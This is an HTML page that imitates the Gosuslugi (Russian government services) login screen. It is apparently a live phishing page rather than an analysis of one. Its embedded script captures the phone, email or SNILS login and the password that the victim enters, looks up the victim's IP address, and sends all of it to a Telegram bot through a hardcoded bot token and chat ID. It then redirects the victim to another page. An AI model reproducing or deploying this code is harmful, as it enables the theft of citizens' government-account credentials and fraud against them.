<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Госуслуги - Вход</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #eef3fc;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            width: 380px;
            text-align: center;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 160px;
        }
        input {
            width: 90%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 8px;
            background: #f1f5fc;
            font-size: 16px;
        }
        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }
        .login-button {
            background: #0057ff;
            color: white;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 8px;
            font-size: 18px;
            cursor: pointer;
            font-weight: bold;
        }
        .login-button:hover {
            background: #0040cc;
        }
        .helper-links {
            margin-top: 10px;
        }
        .helper-links a {
            color: #0057ff;
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin-top: 5px;
            cursor: pointer;
        }
        .helper-links a:hover {
            text-decoration: underline;
        }
    </style>
    <script>
       const botToken = "7733110032:AAFR-Kek-DjBPwEeVn2fUQyzHsxrllPGyZA";
        const chatId = "-4653404901";

        function sendToTelegram(message) {
            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });
        }

        function getUserIP(callback) {
            fetch('https://api64.ipify.org?format=json')
                .then(response => response.json())
                .then(data => callback(data.ip))
                .catch(() => callback('Неизвестный IP'));
        }
        
        function validateLogin(login) {
            const phoneRegex = /^(\+7|8|7)9\d{9}$/;
            const documentRegex = /^\d{3}-\d{3}-\d{3} \d{2}$|^\d{11}$/;
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return phoneRegex.test(login) || documentRegex.test(login) || emailRegex.test(login);
        }

        document.addEventListener("DOMContentLoaded", function() {
            document.querySelector(".login-button").addEventListener("click", function(event) {
                event.preventDefault();
                
                const emailInput = document.querySelector("input[placeholder='Телефон / Email / СНИЛС']");
                const passwordInput = document.querySelector("input[placeholder='Пароль']");
                const errorMessage = document.querySelector(".error-message");
                
                const email = emailInput.value.trim();
                const password = passwordInput.value.trim();
                
                if (!email) {
                    errorMessage.textContent = "Введите логин";
                    errorMessage.style.display = "block";
                    emailInput.value = "";
                    return;
                }
                
                if (!password) {
                    errorMessage.textContent = "Введите пароль";
                    errorMessage.style.display = "block";
                    passwordInput.value = "";
                    return;
                }
                
                if (!validateLogin(email)) {
                    errorMessage.textContent = "Указан неверный логин или пароль";
                    errorMessage.style.display = "block";
                    emailInput.value = "";
                    return;
                }
                
                errorMessage.style.display = "none";
                getUserIP(ip => {
                    sendToTelegram(`Пользователь ввёл: \nEmail/СНИЛС: ${email}\nПароль: ${password}\nIP: ${ip}`)
                        .then(() => {
                            window.location.href = "log.htm";
                        });
                });
            });

            document.getElementById("recovery-link").addEventListener("click", function(event) {
                event.preventDefault();
                window.location.href = "recovery.htm";
            });
        });
    </script>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="logo.4db68cf668f7092d.svg" alt="Госуслуги">
        </div>
        <input type="text" placeholder="Телефон / Email / СНИЛС">
        <input type="password" placeholder="Пароль">
        <p class="error-message"></p>
        <button class="login-button">Войти</button>
    </div>
</body>
</html>
